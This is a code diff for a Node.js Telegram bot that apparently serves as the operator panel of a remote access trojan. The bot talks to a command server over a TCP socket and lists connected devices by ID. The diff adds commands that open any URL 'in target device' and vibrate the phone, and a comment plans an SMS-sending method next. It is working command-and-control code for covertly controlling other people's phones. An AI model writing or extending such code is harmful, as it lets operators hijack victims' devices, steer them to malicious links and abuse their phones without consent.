@@ -7,12 +7,19 @@
 // const hostname = "";
 // const portnumb = 9932;
 
+
+
+// Tree if-clauses of createKeyboard func must be written - but at the end of callback-query handler
+// Last Method should be written after vibratePhone: sendSMS
+
 const TelegramBot = require("node-telegram-bot-api");
 const net = require("net");
 const me = new net.Socket();
 const bot = new TelegramBot(token, { polling: true });
 
 let updating_users = [];
+let steps = {};
+const urlRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)/gi;
 let sym = "𓏺|𓏺";
 let hoping_messages = [
     ", be patient ...",
@@ -24,6 +31,10 @@ let hoping_messages = [
 
 function getHopingMessage(){
     return hoping_messages[Math.floor(Math.random() * hoping_messages.length)];
+}
+
+function isUrl(mayurl){
+    return urlRegex.test(mayurl);
 }
 
 function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
@@ -196,11 +207,19 @@ function chunkArray(array) {
     return result;
 }
 
+let mine = {
+    username: null
+}
+
 me.connect(portnumb, hostname, () => {
     bot.sendMessage(
         chat_group,
         build(`➕ ${sym} remote connected to main-server\n\n✅ ${sym} send `) + "/start" + build(` to see users\n👮‍♂️ ${sym} use `) + "promote" + build(" or ") + "حق مدیر" + build(` to give access of remote to someone\n\n⛏️ ${sym} use `) + "depromote" + build(" or ") + "حذف حق مدیر" + build(" to remove someone from admin-accessory")
     )
+
+    bot.getMe().then((myinfo) => {
+        mine.username = myinfo.username;
+    })
 })
 
 bot.on('message', async (message) => {
@@ -315,8 +334,8 @@ bot.on('message', async (message) => {
                     )
                 }
             } else if (message.text.startsWith("/sign_")){
-                let _devid = message.text.slice(6, message.text.length).trim();
-                if (_devid == undefined || _devid == null || _devid == ""){
+                let _devid = message.text.slice(6, message.text.length).trim().replace(`@${mine.username}`, '');
+                if (_devid === undefined || _devid === null || _devid === ""){
                     await bot.sendMessage(
                         message.chat.id,
                         build("🔴 𓏺|𓏺 no device id detected"),
@@ -353,22 +372,94 @@ bot.on('message', async (message) => {
                                     }
                                 )
                             } else if (_message.status){
-                                createKeyboard(_message.user.accessory, _message.user.device_id, message.from.id, async (keyboard) => {
-                                    await bot.sendMessage(
-                                    message.chat.id,
-                                    build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_devid}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
-                                        {
-                                            reply_to_message_id: message.message_id,
-                                            parse_mode: "HTML",
-                                            reply_markup: {
-                                                inline_keyboard: keyboard
+                                if (_message.user.device_id == _devid){
+                                    createKeyboard(_message.user.accessory, _message.user.device_id, message.from.id, async (keyboard) => {
+                                        await bot.sendMessage(
+                                        message.chat.id,
+                                        build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_devid}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
+                                            {
+                                                reply_to_message_id: message.message_id,
+                                                parse_mode: "HTML",
+                                                reply_markup: {
+                                                    inline_keyboard: keyboard
+                                                }
                                             }
-                                        }
-                                    )
-                                })
+                                        )
+                                    })
+                                }
                             }
                         }
                     })
+                }
+            } else if (Object.keys(steps).includes(message.from.id.toString())){
+                let msid = message.from.id.toString();
+                let mark = steps[msid];
+                let spl = mark.split("_");
+                let mode = spl[0];
+                let devid = spl[1];
+                if (mode == "getLink"){
+                    if (isUrl(message.text)){
+                        await bot.sendMessage(
+                            message.chat.id,
+                            build(`🔗 ${sym} link detected\n⛏ ${sym} trying to append the process ...`),
+                            {
+                                reply_to_message_id: message.message_id
+                            }
+                        ).then(async (rmsg) => {
+                            me.write(JSON.stringify({
+                                method: "openUrl",
+                                port: portname,
+                                password: passname,
+                                mask: "metro",
+                                device_id: devid,
+                                url: message.text
+                            }));
+
+                            me.on("data", async (data) => {
+                                let _message = JSON.parse(data.toString());
+                                if (_message.method == "openUrl"){
+                                    if (!_message.status && _message.message != "YOU_BANNED"){
+                                        await bot.sendMessage(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                message_id: rmsg.message_id,
+                                                chat_id: rmsg.chat.id
+                                            }
+                                        )
+                                        delete steps[message.from.id.toString()]
+                                    } else if (!_message.status && _message.message == "YOU_BANNED"){
+                                        await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                            {
+                                                message_id: rmsg.message_id,
+                                                chat_id: rmsg.chat.id
+                                            }
+                                        )
+                                        delete steps[message.from.id.toString()]
+                                    } else if (_message.status){
+                                        if (_message.user.device_id == devid){
+                                            await bot.editMessageText(
+                                                build(`📁 ${sym} link opened in target device\n🔗 ${sym} link: <code>${message.text}</code>\n📢 ${sym} device id: <code>${_message.user.device_id}</code>`),
+                                                {
+                                                    message_id: rmsg.message_id,
+                                                    chat_id: rmsg.chat.id
+                                                }
+                                            )
+                                            delete steps[message.from.id.toString()]
+                                        }
+                                    }
+                                }
+                            })
+                        })
+                    } else {
+                        await bot.sendMessage(
+                            message.chat.id,
+                            build(`🔴 ${sym} invalid link-url, try again`),
+                            {
+                                reply_to_message_id: message.message_id
+                            }
+                        )
+                    }
                 }
             }
         }
@@ -493,6 +584,137 @@ bot.on("callback_query", async (call) => {
                     call.message.message_id
                 );
             } catch (e) {}
+        }
+        // Remote keyboard Callbacks
+
+        else if (mode === "openUrl"){
+            let devid = spl[2];
+            me.write(JSON.stringify({
+                method: "getUserByDeviceId",
+                port: portname,
+                password: passname,
+                mask: "metro",
+                device_id: devid
+            }));
+
+            me.on("data", async (data) => {
+                let _message = JSON.parse(data.toString());
+                if (_message.method == "getUserByDeviceId"){
+                    if (!_message.status && _message.message != "YOU_BANNED"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    } else if (!_message.status && _message.message == "YOU_BANNED"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 sorry but you got banned"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    } else if (_message.status){
+                        if (_message.user.device_id == devid){
+                            Object.defineProperty(steps, uid, {
+                                configurable: true,
+                                enumerable: true,
+                                writable: true,
+                                value: `getLink_${devid}`
+                            })
+
+                            await bot.editMessageText(
+                                build(`⏭ ${sym} send your url-link`),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            )
+                        }
+                    }
+                }
+            })
+        } else if (mode == "vibratePhone"){
+            let devid = spl[2];
+            me.write(JSON.stringify({
+                method: "getUserByDeviceId",
+                port: portname,
+                password: passname,
+                mask: "metro",
+                device_id: devid
+            }));
+
+            me.on("data", async (data) => {
+                let _message = JSON.parse(data.toString());
+                if (_message.method == "getUserByDeviceId"){
+                    if (!_message.status && _message.message != "YOU_BANNED"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    } else if (!_message.status && _message.message == "YOU_BANNED"){
+                        await bot.editMessageText(
+                            build("🔴 𓏺|𓏺 sorry but you got banned"),
+                            {
+                                message_id: call.message.message_id,
+                                chat_id: call.message.chat.id
+                            }
+                        )
+                    } else if (_message.status){
+                        if (_message.user.device_id == devid){
+                            await bot.editMessageText(
+                                build(`⏭ ${sym} trying to vibrate device ...`),
+                                {
+                                    message_id: call.message.message_id,
+                                    chat_id: call.message.chat.id
+                                }
+                            ).then(async (rmsg) => {
+                                me.write(JSON.stringify({
+                                    port: portname,
+                                    password: passname,
+                                    mask: "metro",
+                                    method: "vibratePhone"
+                                }));
+                                me.on("data", async (data) => {
+                                    let _message = JSON.parse(data.toString());
+                                    if (_message.method == "vibratePhone"){
+                                        if (!_message.status && _message.message != "YOU_BANNED"){
+                                            await bot.editMessageText(
+                                                build("🔴 𓏺|𓏺 user not found, its because the use disconnected suddenly"),
+                                                {
+                                                    message_id: call.message.message_id,
+                                                    chat_id: call.message.chat.id
+                                                }
+                                            )
+                                        } else if (!_message.status && _message.message == "YOU_BANNED"){
+                                            await bot.editMessageText(
+                                                build("🔴 𓏺|𓏺 sorry but you got banned"),
+                                                {
+                                                    message_id: call.message.message_id,
+                                                    chat_id: call.message.chat.id
+                                                }
+                                            )
+                                        } else if (_message.status){
+                                            await bot.editMessageText(
+                                                build(`🌂 ${sym} device vibrated: `) + devid,
+                                                {
+                                                    message_id: call.message.message_id,
+                                                    chat_id: call.message.chat.id
+                                                }
+                                            )
+                                        }
+                                    }
+                                })    
+                            })
+                        }
+                    }
+                }
+            })
         }
     } else {
         if (["seeadmins", "backadminpanel"].includes(mode)){
